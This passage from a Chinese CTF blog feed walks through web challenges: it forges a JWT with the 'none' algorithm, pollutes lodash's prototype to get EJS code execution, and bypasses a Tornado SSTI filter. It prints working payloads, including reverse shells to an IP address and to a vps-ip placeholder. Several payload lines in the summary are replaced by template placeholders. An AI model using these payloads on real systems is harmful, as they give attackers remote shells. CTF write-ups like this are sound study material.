在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫 token 撤销，它允许我们根据相同的授权许可使特定的 token 甚至一组 token 无效。</p>\n<p>5.5. JWT 与 OAuth 的区别 -OAuth2 是一种授权框架 ，JWT 是一种认证协议 - 无论使用哪种方式切记用 HTTPS 来保证数据的安全性 -OAuth2 用在使用第三方账号登录的情况 (比如使用 weibo, qq, github 登录某个 app)，而 JWT 是用在前后端分离，需要简单的对后台 API 进行保护时使用。</p>\n</blockquote>\n<p>拿到题目的第一步先检查这个题目的源代码，发现注释中存在 /source,</p>\n<p>打开后查看：</p>\n<pre><code class=\"language-php+HTML\">// 导入所需的模块\nconst express = require('express'); // 导入Express框架\nconst bodyParser = require('body-parser'); // 导入解析请求体的中间件\nconst lodash = require('lodash'); // 导入Lodash工具库\nconst session = require('express-session'); // 导入Express的会话管理中间件\nconst randomize = require('randomatic'); // 导入生成随机字符串的库\nconst jwt = require('jsonwebtoken'); // 导入JSON Web Token（JWT）的库\nconst crypto = require('crypto'); // 导入加密算法的库\nconst fs = require('fs'); // 导入文件系统模块\n\nglobal.secrets = []; // 全局数组，用于存储秘钥信息\n\nexpress() // 创建Express应用程序实例\n.use(bodyParser.urlencoded(&#123;extended: true&#125;)) // 使用body-parser中间件来解析URL编码的请求体\n.use(bodyParser.json()) // 使用body-parser中间件来解析JSON格式的请求体\n.use('/static', express.static('static')) // 设置静态文件目录\n.set('views', './views') // 设置视图文件的目录\n.set('view engine', 'ejs') // 设置视图引擎为EJS\n.use(session(&#123; // 使用Express会话中间件配置会话选项\n    name: 'session', // 会话名称\n    secret: randomize('a', 16), // 生成随机的会话密钥\n    resave: true, // 重新保存会话\n    saveUninitialized: true // 保存未初始化的会话\n&#125;))\n.get('/', (req, res) =&gt; &#123; // 处理根路径的GET请求\n    if (req.session.data) &#123; // 如果会话中有数据\n        res.redirect('/home'); // 重定向到主页\n    &#125; else &#123;\n        res.redirect('/login'); // 否则重定向到登录页面\n    &#125;\n&#125;)\n.get('/source', (req, res) =&gt; &#123; // 处理/source路径的GET请求\n    res.set('Content-Type', 'text/javascript;charset=utf-8'); // 设置响应头的Content-Type\n    res.send(fs.readFileSync(__filename)); // 读取当前文件内容并发送给客户端\n&#125;)\n.all('/login', (req, res) =&gt; &#123; // 处理/login路径的所有HTTP方法的请求\n    if (req.method == &quot;GET&quot;) &#123; // 如果是GET请求\n        res.render('login.ejs', &#123;msg: null&#125;); // 渲染登录页面，传递空消息\n    &#125;\n    if (req.method == &quot;POST&quot;) &#123; // 如果是POST请求\n        const &#123;username, password, token&#125; = req.body; // 从请求体中获取用户名、密码和令牌\n        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; // 解码令牌获取秘钥ID\n\n        if (sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;\n            return res.render('login.ejs', &#123;msg: 'login error.'&#125;); // 如果秘钥ID无效，渲染登录页面并显示错误消息\n        &#125;\n        const secret = global.secrets[sid]; // 获取对应秘钥\n        const user = jwt.verify(token, secret, &#123;algorithm: &quot;HS256&quot;&#125;); // 验证JWT令牌\n        if (username === user.username &amp;&amp; password === user.password) &#123; // 如果用户名和密码匹配\n            req.session.data = &#123; // 存储会话数据\n                username: username,\n                count: 0,\n            &#125;\n            res.redirect('/home'); // 重定向到主页\n        &#125; else &#123;\n            return res.render('login.ejs', &#123;msg: 'login error.'&#125;); // 如果用户名或密码不匹配，渲染登录页面并显示错误消息\n        &#125;\n    &#125;\n&#125;)\n.all('/register', (req, res) =&gt; &#123; // 处理/register路径的所有HTTP方法的请求\n    if (req.method == &quot;GET&quot;) &#123; // 如果是GET请求\n        res.render('register.ejs', &#123;msg: null&#125;); // 渲染注册页面，传递空消息\n    &#125;\n    if (req.method == &quot;POST&quot;) &#123; // 如果是POST请求\n        const &#123;username, password&#125; = req.body; // 从请求体中获取用户名和密码\n        if (!username || username == 'nss') &#123;\n            return res.render('register.ejs', &#123;msg: &quot;Username existed.&quot;&#125;); // 如果用户名为空或已存在，渲染注册页面并显示错误消息\n        &#125;\n        const secret = crypto.randomBytes(16).toString('hex'); // 生成16字节的随机秘钥\n        const secretid = global.secrets.length; // 计算秘钥ID\n        global.secrets.push(secret); // 将秘钥存储到全局数组中\n        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &quot;HS256&quot;&#125;); // 使用秘钥签发JWT令牌\n        res.render('register.ejs', &#123;msg: &quot;Token: &quot; + token&#125;); // 渲染注册页面并显示生成的令牌\n    &#125;\n&#125;)\n.all('/home', (req, res) =&gt; &#123; // 处理/home路径的所有HTTP方法的请求\n    if (!req.session.data) &#123; // 如果没有会话数据\n        return res.redirect('/login'); // 重定向到登录页面\n    &#125;\n    res.render('home.ejs', &#123; // 渲染主页\n        username: req.session.data.username || 'NSS',\n        count: req.session.data.count || '0',\n        msg: null\n    &#125;)\n&#125;)\n.post('/update', (req, res) =&gt; &#123; // 处理/update路径的POST请求\n    if (!req.session.data) &#123; // 如果没有会话数据\n        return res.redirect('/login'); // 重定向到登录页面\n    &#125;\n    if (req.session.data.username !== 'nss') &#123; // 如果用户名不是'nss'\n        return res.render('home.ejs', &#123; // 渲染主页并显示错误消息\n            username: req.session.data.username || 'NSS',\n            count: req.session.data.count || '0',\n            msg: 'U cant change uid'\n        &#125;)\n    &#125;\n    let data = req.session.data || &#123;&#125;; // 获取会话数据\n    req.session.data = lodash.merge(data, req.body); // 合并请求体中的数据到会话数据中\n    console.log(req.session.data.outputFunctionName); // 打印输出函数名称\n    res.redirect('/home'); // 重定向到主页\n&#125;)\n.listen(827, '0.0.0.0');\n</code></pre>\n<p>代码中的变量 sid 是 JWT 中的 secretid, 要求是不等于 undefined,null 等等。验证用户名时使用了函数 verify ()，verify () 指定算法正确方式应该是通过 algorithms 传入数组，而不是 algorithm，所以这里本质上传了一个空加密，导致允许空密钥，我们无法获得 JWT 密钥 (高版本已修改)。</p>\n<p>在 <code>algorithms</code>  为 <code>none</code>  的情况下，空签名且空秘钥是被允许的；如果指定了 <code>algorithms</code>  为具体的某个算法，则密钥是不能为空的。在 JWT 库中，如果没指定算法，则默认使用 <code>none</code> 。</p>\n<p>所以我们的目标进一步是使得代码中 JWT 解密密钥（secret）为 <code>null</code>  或者 <code>undefined</code> 。</p>\n<p>sid 的弱比较，如果只是允许空密钥的话我们知道 secret 依然无法 verify，这里 sid 如果传个数组就能轻松绕过判断并且</p>\n<p>这样就可以构造任意密钥为空的 JWT 口令了。</p>\n<p>那么我们伪造 JWT 的脚本如下：</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> jwt <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'jsonwebtoken'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>global<span class=\"token punctuation\">.</span>secrets <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> user <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token literal-property property\">secretid</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token literal-property property\">username</span><span class=\"token operator\">:</span> <span class=\"token string\">'nss'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token literal-property property\">password</span><span class=\"token operator\">:</span> <span class=\"token string\">'123456'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string-property property\">\"iat\"</span><span class=\"token operator\">:</span><span class=\"token number\">1693704680</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">const</span> secret <span class=\"token operator\">=</span> global<span class=\"token punctuation\">.</span>secrets<span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">.</span>secretid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">var</span> token <span class=\"token operator\">=</span> jwt<span class=\"token punctuation\">.</span><span class=\"token function\">sign</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">algorithm</span><span class=\"token operator\">:</span> <span class=\"token string\">'none'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>得到：eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoibnNzIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJpYXQiOjE2OTM3MDQ2ODB9.</p>\n<p>然后账号 nss，密码 123456，token 如上登录。</p>\n<p><img data-src=\"../../../images/NSS/7.png\" alt=\"7\" height=\"400px\" width=\"700px\" /></p>\n<p>以 <code>nss</code>  用户名登录后，于 <code>/update</code>  路由中我们可以构造 payload 造成 ejs 模板引擎污染。（ <code>req.session.data = lodash.merge(data, req.body);</code>  中的 <code>merge</code>  函数是原型链污染高位函数）</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token string-property property\">\"__proto__\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token string-property property\">\"client\"</span><span class=\"token operator\">:</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"escapeFunction\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \\\"bash -i >&amp; /dev/tcp/1.94.24.55/6666 0>&amp;1\\\"');\"</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"compileDebug\"</span><span class=\"token operator\">:</span><span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>记得修改一下 <code>Content-type</code>  为 <code>application/json</code> ，以让服务端接受 <code>json</code>  请求</p>\n<h3 id=\"myhurricane\"><a class=\"anchor\" href=\"#myhurricane\">#</a> MyHurricane</h3>\n<blockquote>\n<p>SSTI,Tornado</p>\n</blockquote>\n<h4 id=\"非预期-2\"><a class=\"anchor\" href=\"#非预期-2\">#</a> 非预期：</h4>\n<p>又是直接读环境变量</p>\n<h4 id=\"预期-2\"><a class=\"anchor\" href=\"#预期-2\">#</a> 预期</h4>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTIzMzI5MjQ0\">tornado 模板注入</span></p>\n<p>源码直接给了：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> tornado<span class=\"token punctuation\">.</span>ioloop</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> tornado<span class=\"token punctuation\">.</span>web</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>BASE_DIR <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>dirname<span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 获取当前文件的所在目录</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 自定义简单的 WAF（Web 应用防火墙）函数，用于检查输入数据是否包含特定敏感字符</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">waf</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    blacklist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'\\''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\"'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'('</span><span class=\"token punctuation\">,</span> <span class=\"token string\">')'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'or'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'and'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'not'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">', '</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> blacklist<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> c <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> chunk <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> chunk<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token punctuation\">(</span><span class=\"token number\">31</span> <span class=\"token operator\">&lt;</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检查字符是否在可接受的 ASCII 范围内</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 定义 Tornado 的请求处理类</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">IndexHandler</span><span class=\"token punctuation\">(</span>tornado<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>RequestHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            self<span class=\"token punctuation\">.</span>finish<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 读取当前文件内容并发送给客户端</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">post</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        data <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>get_argument<span class=\"token punctuation\">(</span><span class=\"token string\">\"ssti\"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 获取 POST 请求中名为 \"ssti\" 的参数数据</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span> waf<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 使用自定义的 WAF 函数检查输入数据</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.html'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"&lt;html></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                        &lt;head>&lt;/head></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                        &lt;body style=\"font-size: 30px;\"></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>data<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">&lt;/body>&lt;/html></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                        \"\"\"</span></span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将输入数据渲染为 HTML 页面并保存到 1.html 文件中</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                f<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            self<span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">(</span><span class=\"token string\">'1.html'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 渲染 1.html 并发送给客户端</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            self<span class=\"token punctuation\">.</span>finish<span class=\"token punctuation\">(</span><span class=\"token string\">'no no no'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 如果输入数据不符合 WAF 规则，则发送 \"no no no\" 给客户端</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    app <span class=\"token operator\">=</span> tornado<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>Application<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token punctuation\">(</span><span class=\"token string\">r\"/\"</span><span class=\"token punctuation\">,</span> IndexHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 创建 Tornado 应用，将 URL 路径 \"/\" 映射到 IndexHandler 类</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> compiled_template_cache<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 禁用模板缓存</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    app<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">827</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 监听端口 827</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    tornado<span class=\"token punctuation\">.</span>ioloop<span class=\"token punctuation\">.</span>IOLoop<span class=\"token punctuation\">.</span>current<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 启动 Tornado 的事件循环</span></pre></td></tr></table></figure><pre><code class=\"language-pyhon\">可以看到源码过滤了`'`, `&quot;`, `__`, `(`, `)`, `or`, `and`, `not`, `&#123;&#123;`, `&#125;&#125;`\n\n和flask模板一样，我们可以用`&#123;%`代替`&#123;&#123;`。\n\n过滤这么多，也不是不可以执行命令。\n\n如果没有过滤，我们的payload：\n\n&#123;&#123;eval('__import__(\"os\").popen(\"bash -i >& /dev/tcp/vps-ip/port 0>&1\").read()')&#125;&#125;\n\n有过滤的情况下我们可以使用笔记末尾武器库中的payload（适当进行替换）\n\nimport__('os').system('bash -c \\'bash -i >& /dev/tcp/vps-ip/port 0>&1\\'')\n\"\"\"\n&ssti=&#123;%autoescape None%&#125;&#123;% raw request.body%0a    _tt_utf8=exec%&#125;&amp;\n&quot;&quot;&quot;\n\n也可以用这个：\n\nPOST:ssti=&#123;% set _tt_utf8 =eval %&#125;&#123;% raw request.body_arguments[request.method][0] %&#125;&amp;POST=__import__('os').popen(&quot;bash -c 'bash -i &gt;%26 /dev/tcp/vps-ip/port &lt;%261'&quot;)\n</code></pre>\n<h4 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h4>\n<p>tornado 中无过滤情况下的可使用的 payload</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#1、读文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">6</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">7</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#2、 直接使用函数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">8</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">9</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#3、导入库</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">10</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">11</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#4、flask 中的 payload 大部分也通用</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">12</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">13</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>其中<span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">133</span><span class=\"token punctuation\">]</span>为<span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'os._wrap_close'</span><span class=\"token operator\">></span>类</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>第二个中的x为有__builtins__的<span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#5、利用 tornado 特有的对象或者方法</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">14</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">15</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#6、利用 tornado 模板中的代码注入</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">16</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">17</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "无敌的Web",
                "php是世界上最好的语言",
                "我就是歪脖",
                "又坐牢了"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87(2)/",
            "url": "https://p1kap1.github.io/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87(2)/",
            "title": "NSS题记-web篇(2)",
            "date_published": "2023-08-25T16:00:00.000Z",
            "content_html": "<h2 id=\"2023124\"><a class=\"anchor\" href=\"#2023124\">#</a> 2023/12/4</h2>\n<h3 id=\"swpuctf-2022-新生赛ez_1zpop\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛ez_1zpop\">#</a> [SWPUCTF 2022 新生赛] ez_1zpop</h3>\n<h4 id=\"反序列化弱比较php代码审计\"><a class=\"anchor\" href=\"#反序列化弱比较php代码审计\">#</a> 反序列化，弱比较，php 代码审计。</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dxg</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">fmm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"nonono\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token 